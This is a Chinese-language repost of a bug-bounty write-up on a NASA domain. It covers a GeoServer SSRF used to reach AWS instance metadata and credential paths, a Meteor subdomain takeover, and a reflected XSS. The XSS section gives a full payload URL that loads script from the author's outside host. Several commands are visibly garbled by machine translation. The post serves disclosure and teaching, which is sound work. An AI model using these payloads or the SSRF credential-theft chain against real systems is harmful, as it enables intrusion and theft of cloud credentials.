> **原文链接**: https://mp.weixin.qq.com/s?__biz=MzI0MTUwMjQ5Nw==&mid=2247489248&idx=1&sn=70f029aac6d918322bcc53f2cb77fe65

#  关键 SSRF + 子域名接管 + XSS  
红云谈安全  红云谈安全   2025-06-17 12:39  
  
**免责声明**  
  
由于传播、利用本公众号红云谈安全所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，公众号红云谈安全及作者不为**此**  
承担任何责任，一旦造成后果请自行承担！  
如有侵权烦请告知，我们会立即删除并致歉。谢谢！请在授权的站点测试，遵守网络安全法！  
**仅供**  
**学习使用，****如若非法他用，与平台和本文作者无关，需自行负责！**  
  
我首先进行了一些侦察，枚举了尽可能多的子域名。当时，他们的计划涵盖了大约六个域名，但我专注于其中一个，我将其称为  

```
target.gov
```

  
，这是 NASA 拥有的一个域名，于一周前被添加到他们的漏洞赏金计划中。由于这个域名之前没有被其他黑客测试过，我认为找到有价值的东西的几率会更高。  
  
在这里，我没有做任何特别的事情；我只是运行了一堆不同的工具和方法来尝试收集大量子域名。  

```
amass enum -passive -d target.gov 
amass db -names -d target.gov 
sublist3r -d target.gov 
subfinder -d target.gov 
crt.sh target.gov 
ffuf -u https://FUZZ.target.gov -w /usr/share/wordlists/dirb/common.txt -p 1 
ffuf -u https://target.gov -w /usr/share/wordlists/dirb/common.txt -H &#34;主机：FUZZ.target.gov&#34;
```

  
在收集了大量（大约 60 个）子域名  

```
target.gov
```

  
并将它们保存到 target.txt 中后，我决定使用默认模板运行 nuclei，并使用以下开关：  

```
-l：指定目标列表作为输入
-fr：遵循重定向
-headless：启用需要无头浏览器支持的模板
-sa：扫描与 DNS 记录关联的所有 IP 
-o：输出文件
-c：要并行测试的模板数量
-H：设置标题
nuclei -l targets.txt -fr -sa -headless -c 100 -o nuclei.out -H “用户代理：Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML，如 Gecko) Chrome/124.0.6284.218 Safari/537.36”  
```

  
同时，我运行 httpx 来获取有关在这些子域上运行的底层技术的一些信息，使用以下开关：  

```
-l：指定目标列表作为输入
-sc：显示响应状态代码
-location：显示响应重定向位置
-title：显示页面标题
-server：显示服务器名称
-td：根据 wappalyzer 数据集显示正在使用的技术
-ip：显示主机 ip 
-t：线程
-o：输出文件
httpx -l 目标.txt -sc -位置 -标题 -服务器 -td -ip -t 100 -o httpx.out
```

  
经过数小时的手动检查数十个子域名后，我发现了这些子域名均托管在 AWS 上：  

```
（httpx 输出的一部分）：

https://vis.target.gov [200] [] [Apache] [54.88.xxx.yyy] [vis-prd8-alb-REDACTED.us-east-1.elb.amazonaws.com] [Apache HTTP Server,HSTS] 
https://vis.target.gov [200] [] [Apache] [34.202.xxx.yyy] [vis-prd8-alb-REDACTED.us-east-1.elb.amazonaws.com] [Apache HTTP Server,HSTS] 
https://visdev.target.gov [200] [] [Apache] [54.212.xxx.yyy] [vis-dev-alb-REDACTED.us-west-2.elb.amazonaws.com] [Apache HTTP Server,HSTS] 
https://visdev.target.gov [200] [] [Apache] [54.71.xxx.yyy] [vis-dev-alb-REDACTED.us-west-2.elb.amazonaws.com] [Apache HTTP 服务器，HSTS] 
https://visstaging.target.gov [200] [] [Apache] [54.167.xxx.yyy] [Apache HTTP 服务器，HSTS] 
https://visstaging.target.gov [200] [] [Apache] [52.21.xxx.yyy] [Apache HTTP 服务器，HSTS] 
https://visdev72.target.gov [301,200] [] [Apache] [54.71.xxx.yyy] [vis-dev-alb-REDACTED.us-west-2.elb.amazonaws.com] [Apache HTTP 服务器，HSTS] [https://visdev.target.gov/] 
https://visdev72.target.gov [301,200] [] [Apache] [54.212.xxx.yyy] [vis-dev-alb-REDACTED.us-west-2.elb.amazonaws.com] [Apache HTTP 服务器，HSTS] [https://visdev.target.gov/] 
https://visstaging7.target.gov [301,200] [] [Apache] [52.21.xxx.yyy] [vis-stg7-alb-REDACTED.us-east-1.elb.amazonaws.com] [Apache HTTP 服务器，HSTS] [https://visstaging.target.gov/] 
https://visstaging7.target.gov [301,200] [] [Apache] [54.167.xxx.yyy] [vis-stg7-alb-REDACTED.us-east-1.elb.amazonaws.com] [Apache HTTP 服务器，HSTS] [https://visstaging.target.gov/]
```

  
它们实际上都是同一个页面，只是在不同的环境（开发环境、测试环境）中运行。页面看起来是这样的（和现在一样）：  
  
![img](https://mmbiz.qpic.cn/sz_mmbiz_png/HsnvOqazeMEBKcGQvP8V1FiaY8HcTVuusvlIRlR6QpUicWUExMib1Ez5IZHsfCkJJGeV6FIyVFxPBah6hh8BmKDVA/640?wx_fmt=png&from=appmsg "")  
  
然后我检查了我的原子核日志，看看是否有任何有趣的东西  

```
vis.target.gov
```

  
，令我惊讶的是，我发现了这一点（所有其他的都存在同样的情况  

```
vis*.target.gov
```

  
）。  

```
[geoserver-login-panel] [http] [信息] https://visdev.target.gov/geoserver/web/ [2.20.4] 
[CVE-2021-40822] [http] [高] https://visdev.target.gov/geoserver/TestWfsPost
```

  
我立即关注了这一“高”发现，并开始对 CVE-2021-40822 进行研究。  
# 服务器端请求伪造  
  
此子域名正在运行 GeoServer 实例。GeoServer 是一款用 Java 编写的开源软件，用于共享地理空间数据，例如卫星图像、气候数据、林业数据和水资源数据。这些数据可以显示在 Google 地图、MapBox 和其他类似的地图引擎上。  
  
事实证明，此版本的 GeoServer 存在一个已知的服务器端请求伪造 (SSRF) 漏洞，编号为 CVE-2021-40822，是由我的同胞发现的  
  
沃勒森·莫拉 {phor3nsic}  
  
。他在他的文章  
中更详细地解释了这个漏洞（在我写这篇文章时，我只能通过它的 Google 缓存访问）。  
  
  
他还创建了一个  
概念验证漏洞  
，并将其发布在他的 GitHub 上。漏洞利用过程非常简单。该脚本尝试发出一个 POST 请求，  

```
example.com/geoserver/TestWfsPost
```

  
其中参数“url”指向攻击者的 URL，而“Host”标头也指向另一个 URL。如果获取到任何一个 URL，其内容就会反映在响应中，表明目标存在 SSRF 漏洞。  
  
然后，我尝试在 visdev 子域名上创建这个 PoC。我将 POST 参数“url”指向一个可以检查日志的域名，以及 Host 头，结果如下：  
  
![img](https://mmbiz.qpic.cn/sz_mmbiz_png/HsnvOqazeMEBKcGQvP8V1FiaY8HcTVuusSTJNiaAwPaVrZricDA04Sq9dJgyOlPurv9vcNYxcia87x6P2bzv9NDGhg/640?wx_fmt=png&from=appmsg "")  
  
我收到了来自 visdev 服务器的 ping 请求，它已经在 User-Agent 中泄露了服务器上安装的 Java 版本。因此，可以确认：该服务器确实存在 SSRF 漏洞。对我来说，这真是个好消息！  
  
还记得 httpx 显示所有这些  

```
vis*.target.gov
```

  
子域名都托管在 AWS 上吗？众所周知，AWS 基础设施上的 SSRF 攻击可能造成毁灭性的破坏。这是因为所有 EC2 实例都可以访问 IP 地址为 169.254.169.254 的特定 AWS 服务器。各种云服务提供商（例如 AWS）使用此 IP 向实例提供元数据。它可以返回实例 ID、类型、用户数据、安全组信息等数据。  
  
我的域名上已经配置了一个子域名指向这个元数据服务器（aws.0x7359.com -> 169.254.169.254）。因此，我将它用作“url”参数和“Host”标头的值。结果正如预期的那样：它列出了元数据服务的所有版本。  
  
![img](https://mmbiz.qpic.cn/sz_mmbiz_png/HsnvOqazeMEBKcGQvP8V1FiaY8HcTVuusOBiaiaG1RLNEEetzcmHHUS8wW725Tv8DqUicN0hutIGA6YqYmkibwypNpw/640?wx_fmt=png&from=appmsg "")  
  
可以浏览目录并读取数据。读取主机名会泄露此实例的内部 IP：  
  
![img](https://mmbiz.qpic.cn/sz_mmbiz_png/HsnvOqazeMEBKcGQvP8V1FiaY8HcTVuus6Av3QMpEcQib4p3zPEicgAUBDpJjPrY2zMY3bt8XBLVzwB00UEahWfZA/640?wx_fmt=png&from=appmsg "")  
  
当浏览时  

```
/latest/meta-data/identity-credentials/ec2/security0credentials/ec2-instance
```

  
，可能会获取一些非常关键的信息，例如AccessKeyId，SecretAccessKey和Token。  
  
![img](https://mmbiz.qpic.cn/sz_mmbiz_png/HsnvOqazeMEBKcGQvP8V1FiaY8HcTVuus8yuhRNWoX6D1kvPTTCxtg7ib9smnuWWRXIKkJ7yEF1XPQtR7YJiaL6FQ/640?wx_fmt=png&from=appmsg "")  
  
利用这些信息，可以验证 AWS CLI 并继续利用，可能实现 RCE（远程代码执行）甚至完全接管基础设施，具体取决于权限和安全配置。  
  
我甚至没去核实这些资料，因为我不确定这是否在调查范围之内，而且我又不想被列入FBI的名单。我只是收集了所有证据，然后开始写报告。  
# 子域名接管  
  
在我撰写并向 NASA 在BugCrowd  
上的漏洞披露计划提交 SSRF 报告几个小时后，我收到了 nuclei 的结果  

```
*.target.gov
```

  
，并遇到了另一个“高”项目：  

```
[meteor-takeover]  [http]  [high]  http://REDACTED2022.target.gov [ tech-detect:meteor] [http] [info] https://REDACTED2022.target.gov/ new_targets /nuclei_new_targets.txt:[meteor-takeover] [http] [high] http://REDACTED2022.target.gov new_targets/nuclei_new_targets.txt:[tech-detect:meteor] [http] [info] https://REDACTED2022.target.gov/  
   
```

  
它说“接管”，所以我立即尝试解析 DNS 以查看它指向哪里。  
  
![img](https://mmbiz.qpic.cn/sz_mmbiz_png/HsnvOqazeMEBKcGQvP8V1FiaY8HcTVuustnWXNZjc6JzFIKUOgbQk4f63s00JJTJO0fslC0BEbW2WibG3fvI4Ndg/640?wx_fmt=png&from=appmsg "")  
  
它指向 us-east-1.galaxy-XXXXX.meteor.com，但这个 DNS 已经失效了。该域名下没有任何网页。我在 Google 上快速搜索了一下，找到了  
这篇  
和  
这篇  
解释此次接管的文章。  
  
总而言之，如果我在 meteor.com 上创建一个帐户，我就可以  

```
galaxy-XXXXXX
```

  
在该  

```
us-east-1
```

  
区域重复使用这个主机名，然后在该页面上放置任何我想要的内容。由于子域名  

```
REDACTED2022.target.gov
```

  
指向该  

```
galaxy-XXXXXX
```

  
主机，它将反映该页面的内容，而这些内容将在我的控制之下。  
  
因此，按照上述文章所述，在 meteor.com 上创建一个帐户，启动一个 Docker 容器，并设置好一切后，我就能够在该主机名和区域上启动 Web 服务器：  
  
![img](https://mmbiz.qpic.cn/sz_mmbiz_png/HsnvOqazeMEBKcGQvP8V1FiaY8HcTVuusdbv1eK5MY12kn0JrhCInBpibfrOenB6iaVHyQ5BbmVjElmtxtuhibPu1Q/640?wx_fmt=png&from=appmsg "")  
  
该应用程序已成功部署到  

```
us-east-1.galaxy-XXXXXX.meteor.com
```

  
，并且我拥有了它的完全控制权。由于  

```
REDACTED2022.target.gov
```

  
指向它，因此我也可以控制此 NASA 子域名上提供的内容。  
  
![img](https://mmbiz.qpic.cn/sz_mmbiz_png/HsnvOqazeMEBKcGQvP8V1FiaY8HcTVuushDpraztZCwFdmpO7jjiafZKXdBQFwiaIZmtJibiaD1ghuTBp17qB5S4vVQ/640?wx_fmt=png&from=appmsg "")  
  
当时，我上传了一个带有概念证明（PoC）的index.html，人们访问时看到的内容如下  

```
REDACTED2022.target.gov
```

  
：  
  
![img](https://mmbiz.qpic.cn/sz_mmbiz_png/HsnvOqazeMEBKcGQvP8V1FiaY8HcTVuusIAMvzLJkek6zibLbovZkM8Vzafh2YSfPcs1tHicOiayQGPZlfmZpYywSg/640?wx_fmt=png&from=appmsg "")  
  
哦，实际上我必须在我的帐户中添加一张信用卡并支付 1 美元才能在 meteor.com 上创建该页面，这笔费用在我停用帐户几天后就退还了。  
# 跨站脚本  
  
经过几天后，我又回到了  

```
visdev.TARGET.gov
```

  
，因为还有很多输入我还没有测试过。  
  
![img](https://mmbiz.qpic.cn/sz_mmbiz_png/HsnvOqazeMEBKcGQvP8V1FiaY8HcTVuusI7aq0eiaUSKHA3kk02atTQ8Sb5aNVGaL8KYTk61KiaGVhOI8NiaLY2vRA/640?wx_fmt=png&from=appmsg "")  
  
我开始点击所有内容，使用所有输入，尝试注册和登录，并测试一些常见但旧的东西，例如  

```
' or 1=1
```

  
一些 XSS 等等。  
  
与此同时，我的一个朋友也在测试同一个页面，他在特定的 GET 参数中发现了一个 XSS 漏洞。他使用了payload   

```
/?no_welcome=a'-alert(1)//
```

  
，乍一看有点奇怪，但当我查看源代码时，一切都说得通了。  
  
此参数的值被用作 JavaScript 代码中变量的值。攻击者可以脱离该变量的上下文，直接从 URL 中写入任意 JavaScript 代码。我发现许多其他变量也存在这种行为。  
  
![img](https://mmbiz.qpic.cn/sz_mmbiz_png/HsnvOqazeMEBKcGQvP8V1FiaY8HcTVuus3n0AxELeTe6ffewKmuyXo8icEQzvwsvGvzsM3lic7H9A1KLgsu4hUWHg/640?wx_fmt=png&from=appmsg "")  
  
结果如下：  
  
![img](https://mmbiz.qpic.cn/sz_mmbiz_png/HsnvOqazeMEBKcGQvP8V1FiaY8HcTVuusOuPr8hrNeyRibPrkXQtial6hk91teW2ru7JPIRrTfazVZHMMfkwRbJtw/640?wx_fmt=png&from=appmsg "")  
  
虽然我觉得这已经足够作为XSS的PoC了，但我决定更进一步，使用更通用的payload来武装攻击。这个payload可以编写复杂的恶意JavaScript例程，将其上传到某个地方，然后将其导入到HTML代码中。  

```
document.addEventListener ( 'DOMContentLoaded' , function(){var c = function   ( ) { a ( ) ; } ;   var s = document.createElement ( ' script' ) ; s.src   = ' https://n.0x7359.com/xss.js';s.onreadystatechange = c; document.body.appendChild ( s ) ; } ) ;
  
    

  


  
```

  
这将向https://n.0x7359.com/xss.js  
发出请求并执行以下代码。  

```
函数a () { 
   alert( '跨站警报' ); 
}
```

  
将其最小化并附加到 JavaScript 中，我们最终得到如下结果：  

```
vis.target.gov/REDACTED/?AutoRefreshInterval=%27;document.addEventListener(%27DOMContentLoaded%27,%20function()%7bvar%20c%20=%20function()%7ba();%7d;var%20s%20=%20document.createElement(%27script%27);s.src%20=%20%27https://n.0x7359.com/xss.js%27;s.onreadystatechange%20=%20c;document.body.appendChild(s);%7d);//
```

  
最终结果是：  
  
![img](https://mmbiz.qpic.cn/sz_mmbiz_png/HsnvOqazeMEBKcGQvP8V1FiaY8HcTVuuseLe910c798Shv2EKO6ibudm0Lruda9gdGFTMggXHCYtkDSZVcmGc7ZA/640?wx_fmt=png&from=appmsg "")  
  
攻击者随后可以在社会工程攻击中使用此链接，完全控制在目标浏览器上运行的 JavaScript 代码，并能够实时更改它。  
  
  
  
  
  
